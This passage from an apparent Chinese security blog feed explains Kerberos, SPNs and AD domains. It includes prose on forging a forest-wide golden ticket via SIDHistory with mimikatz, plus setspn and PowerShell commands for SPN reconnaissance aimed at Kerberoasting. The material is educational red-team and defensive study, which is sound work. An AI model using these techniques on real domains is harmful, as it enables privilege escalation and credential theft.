alt="image-20220214015429835"></p><p>如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 Enterprise Admins组权限（域林中的最高权限）的票据。环境与上文普通金票的生成相同。</p><p>首先我们通过klist purge删除当前保存的Kerberos票据，也可以在mimikatz里通过kerberos::purge来删除。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015439963.png" alt="image-20220214015439963"></p><p>然后通过mimikatz重新生成包含根域SID的新的金票</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015451804.png" alt="image-20220214015451804"></p><p>注意这里是不知道根域YUNYING.LAB的krbtgt的密码HASH的，使用的是子域NEWS.YUNYING.LAB中的KRBTGT的密码HASH。</p><p>然后再通过dir访问DC. YUNYING.LAB的共享文件夹，发现已经可以成功访问。</p><p><img src="/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/image-20220214015504196.png" alt="image-20220214015504196"></p><p>此时的这个票据票是拥有整个域林的控制权的。我们知道制作增强金票的条件是通过SIDHistory那防御方法就是在域内主机迁移时进行SIDHistory过滤，它会擦除SIDHistory属性中的内容。</p><p>参考：<a href="https://www.anquanke.com/post/id/172900">https://www.anquanke.com/post/id/172900</a></p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberos与SPN</title>
    <link href="/2022/03/04/Kerberos%E4%B8%8ESPN/"/>
    <url>/2022/03/04/Kerberos%E4%B8%8ESPN/</url>
    
    <content type="html"><![CDATA[<h2 id="一、SPN-简介"><a href="#一、SPN-简介" class="headerlink" title="一、SPN 简介"></a>一、SPN 简介</h2><p><strong>SPN</strong>(ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。</p><p>Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册SPN。一个用户账户下可以有多个SPN，但一个SPN只能注册到一个账户。在内网中，SPN扫描通过查询向域控服务器执行服务发现。这对于红队而言，可以帮助他们识别正在运行重要服务的主机，如终端，交换机等。SPN的识别是kerberoasting攻击的第一步。</p><p><strong>下面通过一个例子来说明SPN的作用：</strong></p><p>当某用户需要访问MySQL服务时，系统会以当前用户的身份向域控查询SPN为MySQL的记录。当找到该SPN记录后，用户会再次与KDC通信，将KDC发放的TGT作为身份凭据发送给KDC，并将需要访问的SPN发送给KDC。KDC中的TGS服务对TGT进行解密。确认无误后，由TGS将一张允许访问该SPN所对应的服务的ST服务票据和该SPN所对应的服务的地址发送给用户，用户使用该票据即可访问MySQL服务。</p><h2 id="二、SPN分为两种类型："><a href="#二、SPN分为两种类型：" class="headerlink" title="二、SPN分为两种类型："></a>二、<strong>SPN分为两种类型：</strong></h2><p>1.一种是注册在活动目录的机器帐户(Computers)下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户(Computers)下。域中的每个机器都会有注册两个SPN：HOST/主机名 和 HOST/主机名.xie.com</p><p>2.另一种是注册在活动目录的域用户帐户(Users)下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下。</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213004516395.png" alt="image-20220213004516395"></p><p><strong>这里以SQLServer服务注册为例：</strong></p><p>SQLServer在每次启动的时候，都会去尝试用自己的启动账号注册SPN。但是在Windows域里，默认普通机器账号有权注册SPN，但是普通域用户账号是没有权注册SPN的。这就会导致这样一个现象，SQL Server如果使用“Local System account”来启动，Kerberos就能够成功，因为SQL Server这时可以在DC上注册SPN。如果用一个域用户来启动，Kerberos就不能成功，因为这时SPN注册不上去。</p><p><strong>解决办法：</strong></p><blockquote><p>可以使用工具SetSPN -S来手动注册SPN。但是这不是一个最好的方法，毕竟手工注册不是长久之计。如果SPN下次丢了，又要再次手动注册。</p><p>所以比较好的方法，是让SQL Server当前启动域账号有注册SPN的权力。要在DC上为域账号赋予 “Read servicePrincipalName” 和 “Write serverPrincipalName” 的权限即可。</p></blockquote><h2 id="三、SPN-格式与配置："><a href="#三、SPN-格式与配置：" class="headerlink" title="三、SPN 格式与配置："></a>三、SPN 格式与配置：</h2><p>微软官方文档：<strong><a href="https://docs.microsoft.com/zh-cn/windows-server/networking/sdn/security/kerberos-with-spn">https://docs.microsoft.com/zh-cn/windows-server/networking/sdn/security/kerberos-with-spn</a></strong></p><p>在 SPN 的语法中存在四种元素，两个必须元素和两个额外元素，其中 &lt; server class &gt;和 &lt; host &gt;为必须元素：</p><blockquote><p>SPN格式：<service class>/<host>:<port>/<service name> </service></port></host></service></p><p><service class>：标识服务类的字符串，可以理解为服务的名称，常见的有WWW、MySQL、SMTP、MSSQL等；必须元素 </service></p><p><host>：服务所在主机名，host有两种形式，FQDN(win7.xie.com)和NetBIOS(win7)名；必须元素 </host></p><p><port>：服务端口,如果服务运行在默认端口上,则端口号(port)可以省略；额外元素 </port></p><p><service name>：服务名称,可以省略；额外元素 </service></p><p>一些服务的SPN示例： </p><p>#Exchange服务 </p><p>exchangeMDB/ex01.xie.com </p><p>#RDP服务 </p><p>TERMSERV/te01.xie.com </p><p>#WSMan/WinRM/PSRemoting服务 </p><p>WSMAN/ws01.xie.com</p></blockquote><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213005306335.png" alt="image-20220213005306335"></p><h2 id="四、使用SetSPN注册SPN"><a href="#四、使用SetSPN注册SPN" class="headerlink" title="四、使用SetSPN注册SPN"></a>四、<strong>使用SetSPN注册SPN</strong></h2><p>SetSPN是一个本地Windows二进制文件，可用于检索用户帐户和服务之间的映射。该实用程序可以添加，删除或查看SPN注册。</p><blockquote><p>主机：win7.xie.com</p></blockquote><blockquote><p>域控：win2008.xie.com</p></blockquote><blockquote><p>当前用户：xie/test</p></blockquote><p><strong>注：注册SPN需要域管理员权限，普通域成员注册会提示权限不够！</strong></p><p>把主机win7.xie.com的mysql服务注册到spn中</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213010820938.png" alt="image-20220213010820938"></p><p>这里有个tips：因为有些文章用的setspn -A 所以 介绍一下两个的区别：<br>根据<a href="http://technet.microsoft.com/library/cc773257">Setspn概述</a>，不建议使用它<code>Setspn -A</code>来添加SPN记录，建议改为使用它<code>Setspn -S</code>。</p><p>据说<code>Setspn -S</code>在添加新SPN之前先检查SPN是否已经存在。<code>Setspn –A</code>不执行此检查。</p><p>尽管可以使用Setspn -A添加SPN，但应改用Setspn -S，因为-S将验证没有重复的SPN。</p><p>但是，在Windows Server 2012上，我看到了<code>Setspn -S</code>并<code>Setspn -A</code>以相同的方式进行操作：如果存在帐户的SPN记录，则使用<code>-A</code>和<code>-S</code>参数都会失败。</p><p><strong>以test用户的身份进行SPN服务的注册</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -S SQLServer/win7.xie.com:1433 <span class="hljs-built_in">test</span>    <span class="hljs-comment">#test必须是当前的用户</span><br>或<br>setspn -U -A SQLServer/win7.xie.com:1433 <span class="hljs-built_in">test</span>    <span class="hljs-comment">#test必须是当前的用户</span><br></code></pre></td></tr></table></figure><p>-u 是指定test为用户账户   参考：<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)</a></p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213011808653.png" alt="image-20220213011808653"></p><p><strong>以WIN7主机的身份在DC(win2008.xie.com)上进行SPN服务(SQLServer)的注册</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">setspn</span> -S SQLServer/win<span class="hljs-number">7</span>.xie.com:<span class="hljs-number">1533</span>/MSSQL win<span class="hljs-number">7</span>    #win<span class="hljs-number">7</span>必须是当前的主机名<br></code></pre></td></tr></table></figure><p>这里由于之前用 test 用户注册过，所以会提示重复，我们可以将端口修改为其他端口，则不是重复的SPN了</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213012130079.png" alt="image-20220213012130079"></p><h2 id="五、SPN的发现"><a href="#五、SPN的发现" class="headerlink" title="五、SPN的发现"></a>五、<strong>SPN的发现</strong></h2><p>由于每台服务器都需要注册用于Kerberos身份验证服务的SPN，因此这为在不进行大规模端口扫描的情况下收集有关内网域环境的信息提供了一个更加隐蔽的方法。</p><p><strong>使用SetSPN查询：</strong></p><p>windows系统自带的setspn可以查询域内的SPN。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">查看当前域内所有的SPN：setspn  -Q  *<span class="hljs-comment">/*</span><br><span class="hljs-comment">查看指定域xie.com注册的SPN：setspn -T xie.com -Q */</span>*      如果指定域不存在，则默认切换到查找本域的SPN<br>查找本域内重复的SPN：setspn -X<br>删除指定SPN：setspn -D MySQL<span class="hljs-regexp">/win7.xie.com:1433/M</span>SSQL hack<br>查找指定用户<span class="hljs-regexp">/主机名注册的SPN：setspn -L username/</span>hostname<br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213015244379.png" alt="image-20220213015244379"></p><p><strong>机器账户：</strong></p><ul><li>CN=DC</li><li>CN=PC2</li></ul><p><strong>域用户账户：</strong></p><ul><li><strong>CN=krbtgt,CN=Users,DC=redteam,DC=com</strong></li></ul><p><strong>注册于域用户下的SPN仅有一个：</strong></p><ul><li><strong>kadmin/changepw</strong></li></ul><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213015146908.png" alt="image-20220213015146908"></p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213015306013.png" alt="image-20220213015306013"></p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213015406626.png" alt="image-20220213015406626"></p><p>图是用的我自己虚拟机</p><h2 id="六、扫描工具"><a href="#六、扫描工具" class="headerlink" title="六、扫描工具"></a>六、扫描工具</h2><p><strong>PowerShell-AD-Recon：</strong></p><p>该工具包提供了一些探测指定SPN的脚本，例如Exchange，Microsoft SQLServer，Terminal等</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213020151584.png" alt="image-20220213020151584"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#Discover-<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PSMSSQLServers</span>.</span></span>ps1的使用,扫描MSSQL服务 Import-Module ./Discover-<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PSMSSQLServers</span>.</span></span>ps1;Discover-PSMSSQLServers #Discover-<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PSMSExchangeServers</span>.</span></span>ps1的使用，扫描Exchange服务 Import-Module ./Discover-<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PSMSExchangeServers</span>.</span></span>ps1;Discover-PSMSExchangeServers #扫描域中所有的SPN信息 Import-Module ./Discover-<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PSInterestingServices</span>.</span></span>ps1;Discover-PSInterestingServices<br></code></pre></td></tr></table></figure><p><strong>GetUserSPNs.ps1：</strong></p><p>GetUserSPNs 是 Kerberoast 工具集中的一个 powershell 脚本，用来查询域内用户注册的 SPN。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> ./GetUserSPNs.ps1<br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213020222523.png" alt="image-20220213020222523"></p><p><strong>GetUserSPNs.vbs：</strong></p><p>GetUserSPNs 是 Kerberoast 工具集中的一个 vbs 脚本，用来查询域内用户注册的 SPN。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">cscript ./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GetUserSPNs</span>.</span></span>vbs<br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213020244356.png" alt="image-20220213020244356"></p><p><strong>PowerView.ps1：</strong></p><p>PowerView是 PowerSpolit 中 Recon目录下的一个powershell脚本，PowerView 相对于上面几种是根据不同用户的 objectsid 来返回，返回的信息更加详细。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">./</span><span class="hljs-variable">PowerView</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">NetUser</span> <span class="hljs-operator">-</span><span class="hljs-variable">SPN</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213020303044.png" alt="image-20220213020303044"></p><p><strong>RiskySPN中的Find-PotentiallyCrackableAccounts.ps1：</strong></p><p>该脚本可以帮助我们自动识别弱服务票据，主要作用是对属于用户的可用服务票据执行审计，并根据用户帐户和密码过期时限来查找最容易包含弱密码的票据。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">./</span><span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">PotentiallyCrackableAccounts</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><span class="hljs-operator">;</span><span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">PotentiallyCrackableAccounts</span> <span class="hljs-operator">-</span><span class="hljs-variable">FullData</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Verbose</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213020402293.png" alt="image-20220213020402293"></p><p>该脚本将提供比klist和Mimikatz更详细的输出，包括组信息，密码有效期和破解窗口。</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213020420487.png" alt="image-20220213020420487"></p><p>使用domain参数，将返回所有具有关联服务主体名称的用户帐户，也就是将返回所有SPN注册在域用户下的用户。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">./</span><span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">PotentiallyCrackableAccounts</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><span class="hljs-operator">;</span><span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">PotentiallyCrackableAccounts</span> <span class="hljs-operator">-</span><span class="hljs-variable">Domain</span> <span class="hljs-string">&quot;xie.com&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213020435777.png" alt="image-20220213020435777"></p><p>更多扫描工具参考：</p><p><a href="https://www.freebuf.com/articles/web/262953.html">https://www.freebuf.com/articles/web/262953.html</a></p><p><a href="https://www.freebuf.com/articles/system/174229.html">https://www.freebuf.com/articles/system/174229.html</a></p><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>​        在 SPN 扫描时我们可以直接通过脚本，或者命令去获悉内网已经注册的 SPN 内容。那 如果想了解这个过程是如何实现的，就需要提到 LDAP 协议。 </p><p>​        LDAP 协议全称是 Lightweight Directory Access Protocol，一般翻译成轻量目录访问协议。 是一种用来查询与更新 Active Directory 的目录服务通信协议。AD 域服务利用 LDAP 命名 路径（LDAP naming path）来表示对象在 AD 内的位置，以便用它来访问 AD 内的对象。</p><p>​        运行在  tcp/ip之上， 一般使用389端口进行数据传输。</p><p>LDAP 数据的组织方式：</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213155139066.png" alt="image-20220213155139066"></p><p>更直观的说可以把 LDAP 协议理解为一个关系型数据库，其中存储了域内主机的各种配 置信息。 在域控中默认安装了 ADSI 编辑器，全称 Active Directory Service Interfaces Editor (ADSI Edit)，是一种 LDAP 的编辑器，可以通过在域控中运行 adsiedit.msc 来打开（服务器上都有， 但是只有域控中的有整个域内的配置信息）。</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213155213484.png" alt="image-20220213155213484"></p><p>通过 adsiedit.msc 我们可以修改和编辑 LADP，在 SPN 查询时实际上就是查询 LADP 中存 储的内容。 比如在我们是实验环境域 whoami.org 中，存在名为computer的一个CN（Organization Unit，可以理解为一个部门，如开发部、财务部等等），其中包含了PC2 这个主机，从主机 属性中可以看到 PC2注册过的 SPN 内容。</p><p>这里是上面用我虚拟机实验添加的spn</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213155758406.png" alt="image-20220213155758406"></p><p>下面是云影 系列的例子：</p><p>比如在我们是实验环境域 YUNYING.LAB 中，存在名为 svcserver 的一个 OU（Organization Unit，可以理解为一个部门，如开发部、财务部等等），其中包含了 tsvc 这个用户，从用户 属性中可以看到 tsvc 注册过的 SPN 内容。</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213155912550.png" alt="image-20220213155912550"></p><p>当我们在一台主机执行 setspn -T yunying.lab -q */*命令查询域内 SPN 时，通过抓包可以 看到正是通过 LDAP 协议向域控中安装的 LDAP 服务查询了 SPN 的内容。</p><p><img src="/2022/03/04/Kerberos%E4%B8%8ESPN/image-20220213155930590.png" alt="image-20220213155930590"></p><p>所以其实那些Powershell脚本其实主要就是通过查询LDAP的内容并对返回结果做一个过滤， 然后展示出来。</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kerberos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberos</title>
    <link href="/2022/03/04/Kerberos/"/>
    <url>/2022/03/04/Kerberos/</url>
    
    <content type="html"><![CDATA[<p><img src="/2022/03/04/Kerberos/image-20220211114025754.png" alt="image-20220211114025754"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Kerberos 是一种由 MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使 用密钥加密技术为客户端/服务器应用程序提供强身份验证。</p><p>因为Kerberos协议 一般运用在域环境中  所以先结束一下域环境</p><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><p>​        由于 Kerberos 主要是用在域环境下的身份认证协议，所以在说之前先说下域环境的一 些概念。首先域的产生是为了解决企业内部的资源管理问题，比如一个公司就可以在网络中 建立一个域环境，更方便内部的资源管理。在一个域中有域控、域管理员、普通用户、主机 等等各种资源。 </p><p>​        在下图中 YUNYING.LAB 为其他两个域的根域，NEWS.YUNYING.LAB 和 DEV.YUNYING.LAB 均为 YUNYING.LAB 的子域，这三个域组成了一个域树。子域的概念可以理解为一个集团在不 同业务上分公司，他们有业务重合的点并且都属于 YUNYING.LAB 这个根域，但又独立运作。 同样 TEST.COM 也是一个单独的域树，两个域树 YUNYING.LAB 和 TEST.COM 组合起来被称为 一个域林。</p><p><img src="/2022/03/04/Kerberos/image-20220211195403199.png" alt="image-20220211195403199"></p><p>​        YUNYING.LAB 的域控是 DC.YUNYING.LAB， 子域 NEWS.YUNYING.LAB 和 DEV.YUNYING.LAB 的域控分别为 NEWSDC.NEWS.YUNYING.LAB 和 DEVDC.DEV.YUNYING.LAB。 </p><p>​        上面说的都是 FQDN(Fully Qualified Domain Name)名称，也就是全限定域名，是同时包含 主机名和域名的名称。 </p><p>​        例：DC.YUNYING.LAB 中 DC 为主机名，域名为 YUNYING.LAB，那他的 FQDN 名称就是 DC.YUNYING.LAB。</p><p><img src="/2022/03/04/Kerberos/image-20220211195519811.png" alt="image-20220211195519811"></p><p>如何搭建域环境以及如何建立子域可参考网上的一些说明，这里放两个链接作为参考。 </p><blockquote><p><a href="https://jingyan.baidu.com/article/19192ad8e1593ae53e5707be.html">https://jingyan.baidu.com/article/19192ad8e1593ae53e5707be.html</a> </p></blockquote><blockquote><p><a href="http://blog.51cto.com/vbers/2058306">http://blog.51cto.com/vbers/2058306</a></p></blockquote><p>这里是参考的云影Kerberos系列</p><h2 id="kerberos-协议概述"><a href="#kerberos-协议概述" class="headerlink" title="kerberos 协议概述"></a>kerberos 协议概述</h2><p>在Kerberos协议中主要是有三个角色的存在：</p><ul><li><p>访问服务的Client</p></li><li><p>提供服务的Server</p></li><li><p>KDC（Key Distribution Center）密钥分发中心 </p></li><li><p>Client代表用户，用户有自己的密码，Server上运行的服务也有自己的密码，KDC是受信任的三方认证中心，它拥有用户和服务的密码信息。</p></li><li><p>KDC服务默认会安装在域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。Client想要访问Server的服务（xxx service），前提是通过KDC认证，再由KDC发放的票据决定Client是否有权限访问Server的服务。</p></li><li><p>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，你可以暂时理解为他就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</p></li></ul><p><img src="/2022/03/04/Kerberos/image-20220212004526739.png" alt="image-20220212004526739"></p><p><strong>名词基本概念：</strong></p><p>​    KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p><p>​    AS: Authentication Service，验证服务，为client生成TGT的服务</p><p>​    TGS: Ticket Granting Service，票据授权服务，验证TGT，发放ST。</p><p>​    TGT: Ticket Granting Ticket，票据授权票据，由KDC的AS发放，客户端获取到该票据后，以后申请其他应用的服务票据(ST)时，就不需要向KDC的AS提交身份认证信息(credential)，TGT具有一定的有效期。由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信息。TGT=KBRTGT HASH（）</p><p>​    ST(Service Ticket)：服务票据，由KDC的TGS发放，是客户端应用程序访问Server某个服务的凭证，Server端验证通过则完成Client与Server端信任关系的建立。</p><p>​    Session key:用来加密client和TGS之间传输的数据。</p><p>​    Server session key:用来加密client和server之间传输的数据、认证</p><p>​    Ticket:票据，是网络中各对象之间互相访问的凭证</p><p>​    AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p>​    DC: Domain Controller，域控</p><p>​    KRBTGT: 每个域控制器都有一个krbtgt账户，是KDC的服务账户，用来创建TGS加密的密钥。</p><p>如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是就是车站的认证系统。如果Client端的票据是合法的（由你本人身份购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是Kerberos中有存在两张票，而火车票从头到尾只有一张。<br>由上图中可以看到KDC又分为两个部分：</p><p>Authentication Server： AS的作用就是验证Client端的身份（确定你是身份上的本人），验证通过就会给一张TGT（Ticket Granting Ticket）票给Client。<br>Ticket Granting Server： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（Service Ticket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。</p><p><img src="/2022/03/04/Kerberos/image-20220212005207409.png" alt="image-20220212005207409"></p><h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><p>​        当域内某个用户(client)去请求同域内的某个服务的时候(server)，这个请求首先会被送到KDC进行身份认判断是否是可信赖的，在AD（account database）中查询该client name对应的master key，并对pre-authentication data数据进行解密，如果可以提取出一个合法的时间戳，那就说明该用户是合法的，验证通过(有些这里是说成黑白名单的说法，在AD中对比黑白名单 看看用户是否是可信赖的)，返回AS，然后AS给用户返回一个可重复使用的TGT，后续Client使用这个TGT向TGS请求ST即可。然后用户再拿着<strong>TGT</strong>票据去请求<strong>TGS</strong>，<strong>TGS</strong>验证成功后会返回一个用对应服务账号的密码<strong>hash</strong>加密过的票据<strong>ST</strong>，然后用户就可以拿着ST去访问server上对应的服务了。但是这个Ticket只能用来访问这个Server，如果要访问其他Server需要向KDC重新申请。</p><h3 id="分步"><a href="#分步" class="headerlink" title="分步"></a>分步</h3><p><img src="/2022/03/04/Kerberos/image-20220212012430878.png" alt="image-20220212012430878"></p><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块：</p><ul><li><p>The Authentication Service Exchange（认证服务器）–&gt;</p><p>Client 与 AS 的交互AS_REQ•AS_REP</p></li><li><p>Ticket-Granting Service (TGS) Exchange（票据授予服务器）–&gt;</p><p>Client 与 TGS 的交互 TGS_REQ•TGS_REP</p></li><li><p>The Client/Server Authentication Exchange（pc和要访问的服务）–&gt;</p><p>Client 与 Server 的交互 AP_REQ•AP_REP</p></li></ul><h3 id="第一步：Client-与-AS"><a href="#第一步：Client-与-AS" class="headerlink" title="第一步：Client 与 AS"></a>第一步：Client 与 AS</h3><p><img src="/2022/03/04/Kerberos/image-20220212013650350.png" alt="image-20220212013650350"></p><h4 id="AS-REQ（请求）："><a href="#AS-REQ（请求）：" class="headerlink" title="AS_REQ（请求）："></a>AS_REQ（请求）：</h4><p><img src="/2022/03/04/Kerberos/image-20220212013147551.png" alt="image-20220212013147551"></p><ul><li>Pre-authentication data:就是用client对应的master key加密了一个timestamp。</li><li>Client info:client用户信息</li><li>Server info:这里并不是Client真正要访问的Server的名称，实际上是KDC的Ticket Granting Service的Server Name。</li></ul><p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1，内容为通过 Client 密码 Hash 加密的 时间戳、Client ID、网络地址、加密类型等内容。KDC端收到该请求后，Authentication service用client info部分信息，在AD（account database）中查询该client name对应的master key，并对pre-authentication data数据进行解密，如果可以提取出一个合法的时间戳，那就说明该用户是合法的，验证通过，并回复KRB_AS_REP给client。</p><h4 id="AS-REP（返回）："><a href="#AS-REP（返回）：" class="headerlink" title="AS_REP（返回）："></a><strong>AS_REP（返回）：</strong></h4><p><img src="/2022/03/04/Kerberos/image-20220212014028121.png" alt="image-20220212014028121"></p><ul><li><p>AS 收到用户认证请求后，AS 根据请求中的 用户名 AA 信息，从数据库中查找用户名是否存在。如果 用户名 AA 存在，则从 KDC 中可以获取 用户 AA 的密码，使用单向函数为该密码生成一个 Client 密钥（即NTLM Hash）。AS 生成随机字符串 Client/TGS Session Key，使用 Client 密钥(用户 AA 的密码 NTLM Hash)对 Client/TGS Session Key 加密得到 sessionkey_as； //Sessionkey_as = 用户密码NTLM HASH(Client/TGS Session Keys)</p></li><li><p>再使用 TGS 密钥(krbtgt 用户的 NTLM Hash)对 Client/TGS Session Key 、 Client Info 和 Timestamp 加密,得到 TGT（TGT票据）。</p></li><li><p>//TGT = KRBTGT用户NTLM Hash(Client/TGS Session_key,Client info,Timestamp)</p></li><li><p>将 sessionkey_as 和 TGT 一起返回给 Client。</p></li><li><p>Client 收到 AS 的响应消息后，利用自身的 Client 密钥（AA 的 NTLM Hash）对sessionkey_as 解密，这样就获取到 Client/TGS Session Key。</p></li></ul><p><strong>总体来说</strong>，<strong>KRB_AS_REP</strong>分为两部分：</p><ul><li>用client master key对session key进行加密后的值。Session key是KDC随机生成的UUID，用于client和TGS服务之间的数据加密、认证。</li><li>用KDC master key值对Client/TGS Session Key进行加密。这部分client解不了。由此处也可以看出，TGT包括三个部分，分别是session key、client name、end time。（当响应信息里面有KDC Hash，即可伪造黄金票据） //Master Key = NTLM Hash</li></ul><h3 id="第二步：Client与TGS交互"><a href="#第二步：Client与TGS交互" class="headerlink" title="第二步：Client与TGS交互"></a>第二步：Client与TGS交互</h3><p><img src="/2022/03/04/Kerberos/image-20220212020233719.png" alt="image-20220212020233719"></p><p>当client端接收到AS_REP时，client使用client master key对KRB_AS_REP的第一部分信息进行解密，得到session key，并再次拼装出TGS_REQ请求体，向KDC的TGS发出请求</p><p>请求结构如下，TGS_REQ请求体包括：client/TGS Session key(client info+时间戳)、TGT、client info、server info；</p><p>其中，server info就是该client真正要访问的server，步骤一AS_REQ中的不一样</p><h4 id="TGS-REQ（请求）："><a href="#TGS-REQ（请求）：" class="headerlink" 